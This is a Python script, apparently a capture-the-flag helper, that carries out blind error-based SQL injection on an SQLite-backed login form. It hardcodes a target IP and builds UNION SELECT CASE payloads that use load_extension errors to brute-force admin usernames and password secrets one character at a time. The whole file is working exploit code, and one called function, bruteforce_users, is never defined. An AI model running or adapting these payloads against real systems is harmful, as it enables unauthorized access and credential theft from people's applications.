import requests,string
import argparse
import pyfiglet
import sys, os
from termcolor import colored
url= 'http://34.74.105.127/b7ed9a6d50/login'

chars= string.printable
arg_parser = argparse.ArgumentParser(description='SQLITE injnection, bruteforce password or enum users, exploiting an insert into ')
arg_parser.add_argument('-m', '--method', dest='method', help='Htp method to use for injection, set to POST by default', type=str, default="POST")
arg_parser.add_argument('-a','--action', dest='action', help='Define the action to do ("users" or "password" )\n "password" By default ', default='password', type=str)
arg_parser.add_argument('-u','--user', dest="user", help='The user which we want to find the password, Use it with password action \n By default the user is empty', default='', type=str)
arg_parser.add_argument('-ul','--user-list', dest="userlist", help='List of users to test if exist in the db. \n Use with "users" action. ', default='', type=str)
arg_parser.add_argument('-e','--msgerror', dest='caught', help='The message error which return when sqli works ', required=True, type=str)
arg_parser.add_argument('-l','--url', dest="url", help='The url of the sqli', required=True, type=str)
arg_parser.add_argument('-p','--parameter', dest='parameter', help='Define if we have a different injectable parameter, by default use ("username "password")', default='', type=str)
arg_parser.add_argument("-H", dest="header", type=str, help="One or multiple header for the request, separate with a space\nUse like 'key1:value1 key2:value2'")
arg_parser.add_argument("-c", "--cookies", dest="cookies", type=str, help="One or multiple cookies values for the request, separate with a space\nUse like 'PHPSESSID=shuv7rnuv UserToken=yes'")
arg_parser.add_argument('--proxy', dest='proxy', help='Use a default proxy at "127.0.0.1:8080". set to False by default', action="store_true")

args = arg_parser.parse_args()
# Roughiz banner
print("")
ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
print(ascii_banner)
print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green")  )
print(colored("SQLITE Injection script by R0()Gh1z", "green"))
print("-=" * 50+"\n")
print("")

# proxy set for test
def proxy():
  if args.proxy:
    return {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
  else:
    return {} 

# define header 
HEADERS= {}
if args.header is not None:
  for header in args.header.split(" "):
    key= header.split(":")[0].rstrip()
    value = header.split(":")[1].rstrip()
    HEADERS[key] = value

# define header 
COOKIES= {}
if args.cookies is not None:
  for cookie in args.cookies.split(" "):
    key= cookie.split("=")[0].rstrip()
    value = cookie.split("=")[1].rstrip()
    COOKIES[key] = value

#define proxy use    
PROXIES= proxy()

#make a request
def send_request(payload):
  if ( args.method.lower() == "get" ):
    req=requests.get(args.url,allow_redirects=False,verify=False,params=payload, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=PROXIES)
  else:
    req=requests.post(args.url,allow_redirects=False,verify=False,data=payload, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=PROXIES)
  return req  

          
def GetPassLength(username):
  # if know the username
  if username != "":  
      sqli="""')Union SELECT CASE WHEN username='"""+username+"""' and role=1 and length(secret)=%s THEN(select load_extension("/tmp/nothere"))END FROM users;--"""
  else:   # if we donthave a username
      sqli="""')Union SELECT CASE WHEN role=1 and length(secret)=%s THEN(select load_extension("/tmp/nothere"))END FROM users;--"""

  for i in range(1,257):
    if args.parameter == "":
      payload = {'username':sqli%i,'password':"randompassword"}
    else:
      payload = {args.parameter:sqli%i}
    r = send_request(payload)
    if args.caught in  r.text: # if we caught the message error
            print("The password length is : %s" % i)
            break
  return i+1  # we add 1 for the range

def GetUserLength():
  sqli="""')Union SELECT CASE WHEN role=1 and length(username)=%s THEN(select load_extension("/tmp/nothere"))END FROM users;--"""
  #brute force username length:
  for i in range(1,257):
    if args.parameter == "":
      payload = {'username':sqli%i,'password':"randompassword"}
    else:
      payload = {args.parameter:sqli%i}
    r = send_request(payload)
    if args.caught in r.text: # if we caught the message error
       print("The username length is : %s" % i)
       break
  return i+1  # we add 1 for the range

def GetSQLPASS(username,i,c):
  # if know the username
  if username != "": 
      return """')Union SELECT CASE WHEN username='"""+username+"""' and role=1 and substr(secret,%s,1)='%s' THEN(select load_extension("/tmp/n"))END FROM users;--""" % (i,c)  
  else:
      return """')Union SELECT CASE WHEN role=1 and substr(secret,%s,1)='%s' THEN(select load_extension("/tmp/n"))END FROM users;--""" % (i,c) 

def GetSQLUSER(i,c):
  return """')Union SELECT CASE WHEN role=1 and substr(username,%s,1)='%s' THEN(select load_extension("/tmp/n"))END FROM users;--""" % (i,c)

if args.action == "users":
  if args.userlist:
    if not os.path.isfile(args.userlist):
      print(colored('[ERROR] The file "'+args.userlist+'" does not exists', "red"))
      sys.exit(1)
    bruteforce_users()
  else:    
    username_len = GetUserLength()
    print('The username: ',end='',flush=True)
    for i in range(1,username_len):
      for c in chars:
        injection = GetSQLUSER(i,c)
        if args.parameter == "":
          payload = {'username':injection,'password':"randompassword"}
        else:
          payload = {args.parameter:injection}  
        r = send_request(payload)
        if args.caught  in r.text:
          print(c,end='',flush=True)
          break
else:
  pass_len = GetPassLength(args.user)
  print('The password: ',end='',flush=True)
  for i in range(1,pass_len):
    for c in chars:
        injection = GetSQLPASS(args.user,i,c)
        if args.parameter == "":
          payload = {'username':injection,'password':"randompassword"}
        else:
          payload = {args.parameter:injection}  
        r = send_request(payload)
        if args.caught in  r.text:
          print(c,end='',flush=True)
          break
